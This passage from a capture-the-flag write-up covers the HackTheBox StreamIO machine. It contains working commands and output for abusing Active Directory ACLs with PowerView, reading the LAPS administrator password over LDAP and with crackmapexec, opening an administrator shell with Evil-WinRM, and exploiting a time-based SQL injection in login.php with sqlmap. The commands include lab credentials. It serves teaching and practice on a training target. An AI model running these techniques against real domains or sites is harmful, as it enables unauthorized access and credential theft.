WINRM       10.10.11.158    5985   NONE             [-] None\JDgodd:JDg0dd1s@d0p3cr3@t0r

```

## Shell as administrator

### BloodHound

#### Collect

I’ll use [bloodhound-python](https://github.com/fox-it/BloodHound.py) to collect Bloodhound active directory data:

```

oxdf@hacky$ bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.10.11.158 -d streamio.htb -dc streamio.htb --zip
INFO: Found AD domain: streamio.htb
INFO: Connecting to LDAP server: streamio.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: streamio.htb
INFO: Found 8 users
INFO: Connecting to GC LDAP server: dc.streamio.htb
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.streamIO.htb
INFO: Done in 00M 14S
INFO: Compressing output into 20220913110312_bloodhound.zip

```

The zip contains four files with information about various objects in the domain:

```

oxdf@hacky$ unzip -l 20220913110312_bloodhound.zip 
Archive:  20220913110312_bloodhound.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     4225  2022-09-13 11:06   20220913110312_computers.json
    79730  2022-09-13 11:06   20220913110312_groups.json
     2581  2022-09-13 11:06   20220913110312_domains.json
    18229  2022-09-13 11:06   20220913110312_users.json
---------                     -------
   104765                     4 files

```

#### Import Data

I’ll open Bloodhound and clear the database to start fresh (button at the bottom of the “Database Info” tab). I’ll click on the “Upload Data” button from the menu on the right, and give it the zip file:

![image-20220913070832532](https://0xdfimages.gitlab.io/img/image-20220913070832532.png)

#### Analysis

With the data loaded, I’ll search for and mark owned each of the three accounts I have access to. For each, I’ll check the “Outbound Control Rights”. yoshihide and nikk37 don’t have any, but JDgodd shows one:

![image-20220913071107402](https://0xdfimages.gitlab.io/img/image-20220913071107402.png)

Clicking that “1” shows that JDgodd has ownership and `WriteOwner` on the Core Staff group:

![image-20220913071157530](https://0xdfimages.gitlab.io/img/image-20220913071157530.png)

Expanding out from Core Staff, it has `ReadLAPSPassword` on the DC computer object:

![image-20220913071513981](https://0xdfimages.gitlab.io/img/image-20220913071513981.png)

### Get LAPS Password

#### Add User to Core Staff

Working out of `C:\programdata`, I’ll upload a copy of [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) to the box, and import it into my current session:

```
*Evil-WinRM* PS C:\programdata> upload PowerView.ps1
Info: Uploading PowerView.ps1 to C:\programdata\PowerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1

```

Now I’ll need a credential object for JDgodd:

```
*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)

```

I’ll add JDgodd to the group:

```
*Evil-WinRM* PS C:\programdata> Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"

```

JDgodd now shows as a member of Core Staff:

```
*Evil-WinRM* PS C:\programdata> net user jdgodd
...[snip]...

Local Group Memberships
Global Group memberships     *Domain Users         *CORE STAFF
The command completed successfully.

```

#### Get LAPS Password

I can now read the LAPS password from the `ms-MCS-AdmPwd` property on the computer object:

```
*Evil-WinRM* PS C:\programdata> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred

DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
DNSHostName       : DC.streamIO.htb
Enabled           : True
ms-Mcs-AdmPwd     : -Z4I/T1W0%+4nF
Name              : DC
ObjectClass       : computer
ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
SamAccountName    : DC$
SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
UserPrincipalName :

```

Alternatively, this password can also be read from LDAP from my host using the JDgodd creds (once the user is in the Core Staff group):

```

oxdf@hacky$ ldapsearch -h 10.10.11.158 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#                                                                  
# LDAPv3                                               
# base <DC=streamIO,DC=htb> with scope subtree                     
# filter: (ms-MCS-AdmPwd=*)                                    
# requesting: ms-MCS-AdmPwd                                        
#
                                                                   
# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: -Z4I/T1W0%+4nF
...[snip]

```

After publishing, [mpgn](https://twitter.com/mpgn_x64) messaged on Twitter that `crackmapexec` could also pull the LAPS password:

> Really cool Windows machine ! For the last part you can also directly run:  
> cme smb <ip\_dc> -u JDgodd -p xxx --laps --ntds 😀  
>   
> instead of getting the password with ldap <https://t.co/ukKpAW9rXm>
>
> — mpgn (@mpgn\_x64) [September 17, 2022](https://twitter.com/mpgn_x64/status/1571200008895995904?ref_src=twsrc%5Etfw)

It works (even though it shows failure, the password is there):

```

oxdf@hacky$ crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] DC\administrator:-Z4I/T1W0%+4nF STATUS_LOGON_FAILURE 

```

### Evil-WinRM

I’ll use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to get a shell as administrator using that password:

```

oxdf@hacky$ evil-winrm -u administrator -p '-Z4I/T1W0%+4nF' -i 10.10.11.158
                                                                   
Evil-WinRM shell v3.4              

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

The flag isn’t on the administrator’s desktop, but there’s another user in the administrators group:

![image-20220913091626710](https://0xdfimages.gitlab.io/img/image-20220913091626710.png)

The flag is on Martin’s desktop:

```
*Evil-WinRM* PS C:\Users\Martin\desktop> type root.txt
c8d53c49************************

```

This is expected for a machine where the administrator password will change randomly. By putting the flag on another admin user’s desktop, it allows HackTheBox to still rotate the flags (so each box has a unique flag) while still having it where admin access is required.

## Beyond Root - login.php SQLI

### Detect SQLI

During initial enumeration, I didn’t notice that the login page at `https://streamio.htb/login.php` was vulnerable to SQL injection because it’s a time-based blind injection. Sending the login request to Repeater in Burp, I’ll set my username to do a sleep (which uses `WAITFOR` in [MSSQL](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/waitfor-transact-sql?redirectedfrom=MSDN&view=sql-server-ver16)):

![image-20220917063005385](https://0xdfimages.gitlab.io/img/image-20220917063005385.png)

The 5 second sleep results in a return time of 5.097 seconds! That’s injection.

It’s using a stacked query, which is realatively unique to MSSQL, but well suited to something like a sleep.

### sqlmap

Dumping data in a sleep-based injection is a pain, and this page (unlike the other) isn’t set up to break `sqlmap`. I’ll right click on the request and “Copy to file”, saving it as `login.request`. Now I’ll pass that to `sqlmap` (with `--force-ssl` to bypass the TLS certificate failures):

```

oxdf@hacky$ sqlmap -r login.request --force-ssl
...[snip]...
[10:19:51] [INFO] POST parameter 'username' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable 
it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server/Sybase' extending provided level (1) and risk (1) values? [Y/n] 
[10:20:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:20:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:20:10] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 66 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=0xdf';WAITFOR DELAY '0:0:5'--&password=0xdf
---
[10:20:34] [INFO] testing Microsoft SQL Server
[10:20:34] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[10:20:44] [INFO] confirming Microsoft SQL Serverr DBMS delay responses (option '--time-sec')? [Y/n] 
[10:20:49] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 2016 or 10
web application technology: Microsoft IIS 10.0, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
...[snip]...

```

`sqlmap` finds basically the same payload.

Exfiling data is very slow. This request to list the databases takes almost five minutes, but does return the data:

```

oxdf@hacky$ sqlmap -r login.request --force-ssl --batch --dbs
...[snip]...
available databases [5]:
[*] model
[*] msdb
[*] STREAMIO
[*] streamio_backup
[*] tempdb
...[snip]...

```

If I’m willing to invest the time, I can dump the `users` table just like [above](#get-passwords):

```

oxdf@hacky$ sqlmap -r login.request --force-ssl --batch -D STREAMIO -T users -C username,password --dump
...[snip]...

```